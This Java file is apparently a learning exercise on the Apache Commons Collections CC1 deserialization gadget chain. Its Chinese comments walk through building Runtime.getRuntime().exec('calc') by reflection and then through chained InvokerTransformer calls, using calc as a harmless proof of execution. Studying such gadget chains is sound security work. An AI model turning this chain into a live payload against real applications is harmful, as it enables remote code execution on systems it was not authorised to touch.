package org.CC.CC1;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Method;

public class Test {
    public static void main(String[] args) throws Exception {
        //我们要通过反射来构造这一串的方法调用,Runtime.getRuntime().exec("calc");
        //但由于Runtime不可被序列化，我们只能从Class开始，用反射从头构造
        Class c = Runtime.class;
        //接下来获取getRuntime方法和exec方法
        Method getRuntime = c.getMethod("getRuntime", null);
        Method exec = c.getMethod("exec", new Class[]{String.class});
        //再调用getRuntime方法，获取Runtime对象
        Object runtime = getRuntime.invoke(null, null);
        //最后调用exec方法，传入参数calc
        exec.invoke(runtime, new Object[]{"calc"});


        Object o1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        Object o2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(o1);
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(o2);
    }
}
